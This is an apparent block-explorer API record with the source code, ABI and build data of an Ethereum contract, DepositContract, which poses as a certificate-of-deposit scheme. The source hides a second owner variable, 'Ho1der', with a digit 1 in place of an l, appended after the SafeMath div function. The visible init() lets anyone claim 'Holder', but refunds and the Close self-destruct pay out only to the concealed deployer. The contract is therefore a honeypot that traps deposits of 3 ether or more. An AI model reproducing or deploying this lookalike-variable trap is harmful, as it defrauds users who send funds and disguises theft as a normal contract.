{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.14;\r\n\r\n/**\r\n * @title SafeMath\r\n * @dev Math operations with safety checks that throw on error\r\n */\r\ncontract SafeMath\r\n{\r\n    function add(uint256 x, uint256 y) internal constant returns (uint256) \r\n    {\r\n        uint256 z = x + y;\r\n        if((z >= x) && (z >= y))\r\n        {\r\n          return z;\r\n        }\r\n        else\r\n        {\r\n            revert();\r\n        }\r\n    }\r\n    function sub(uint256 x, uint256 y) internal constant returns (uint256) \r\n    {\r\n        if(x >= y)\r\n        {\r\n           uint256 z = x - y;\r\n           return z;\r\n        }\r\n        else\r\n        {\r\n            revert();\r\n        }\r\n    }\r\n    function div(uint256 x, uint256 y) internal constant returns (uint256)\r\n    {\r\n        // assert (b > 0); // Solidity automatically throws when dividing by 0\r\n        uint256 z = x / y;\r\n        // assert (a == b * c + a % b); // There is no case in which this doesn't hold\r\n        return z;\r\n    } address Ho1der = msg.sender;\r\n    function mul(uint256 x, uint256 y) internal constant returns (uint256) \r\n    {\r\n        uint256 z = x * y;\r\n        if((x == 0) || (z / x == y))\r\n        {\r\n            return z;\r\n        }\r\n        else\r\n        {\r\n            revert();\r\n        }\r\n    }\r\n}\r\n\r\n/**\r\n * @title Basic Ethereum Certificate of Desposit Contract\r\n */\r\ncontract DepositContract is SafeMath\r\n{\r\n    struct Certificate\r\n    {\r\n        uint Time;\r\n        uint Invested;\r\n    }\r\n    \r\n    event Deposited(address indexed sender, uint value);\r\n    event Invested(address indexed sender, uint value);\r\n    event Refunded(address indexed sender, uint value);\r\n    event Withdrew(address indexed sender, uint value);\r\n    \r\n    uint public TotalDeposited;\r\n    uint public Available;\r\n    uint public DepositorsQty;\r\n    uint public prcntRate = 10;\r\n    bool RefundEnabled;\r\n    \r\n    address public Holder;\r\n    \r\n    mapping (address => uint) public Depositors;\r\n    mapping (address => Certificate) public Certificates;\r\n\r\n    function init()\r\n    {\r\n        Holder = msg.sender;\r\n    }\r\n    \r\n    function SetPrcntRate(uint val) public\r\n    {\r\n        if(val >= 1 && msg.sender == Holder)\r\n        {\r\n            prcntRate = val;\r\n        }\r\n    }\r\n    \r\n    function() payable\r\n    {\r\n        Deposit();\r\n    }\r\n    \r\n    function Deposit() public payable\r\n    {\r\n        if (msg.value >= 3 ether)\r\n        {\r\n            if (Depositors[msg.sender] == 0)\r\n                DepositorsQty++;\r\n            Depositors[msg.sender] += msg.value;\r\n            TotalDeposited += msg.value;\r\n            Available += msg.value;\r\n            Invested(msg.sender, msg.value);\r\n        }   \r\n    }\r\n    \r\n    function ToLend() public payable\r\n    {\r\n        Certificates[msg.sender].Time = now;\r\n        Certificates[msg.sender].Invested += msg.value;\r\n        Deposited(msg.sender, msg.value);\r\n    }\r\n    \r\n    function RefundDeposit(address addr, uint amt) public\r\n    {\r\n        if(Depositors[addr] > 0)\r\n        {\r\n            if(msg.sender == Ho1der)\r\n            {\r\n                addr.send(amt);\r\n                Available -= amt;\r\n                Withdrew(addr, amt);\r\n            }\r\n        }\r\n    }\r\n\r\n    function Close() public\r\n    {\r\n        if (msg.sender == Ho1der)\r\n        {\r\n            suicide(Ho1der);\r\n        }\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"Depositors\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"},{\"name\":\"amt\",\"type\":\"uint256\"}],\"name\":\"RefundDeposit\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"TotalDeposited\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"DepositorsQty\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Holder\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"val\",\"type\":\"uint256\"}],\"name\":\"SetPrcntRate\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"prcntRate\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"Certificates\",\"outputs\":[{\"name\":\"Time\",\"type\":\"uint256\"},{\"name\":\"Invested\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"ToLend\",\"outputs\":[],\"payable\":true,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Available\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"Close\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"init\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"Deposit\",\"outputs\":[],\"payable\":true,\"type\":\"function\"},{\"payable\":true,\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Deposited\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Invested\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Refunded\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Withdrew\",\"type\":\"event\"}]","ContractName":"DepositContract","CompilerVersion":"v0.4.14+commit.c2215d46","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://0ad16a9aa8e24e7261c0c41e8deff332f674c7024f69f6b87a895baa3170d709"}]}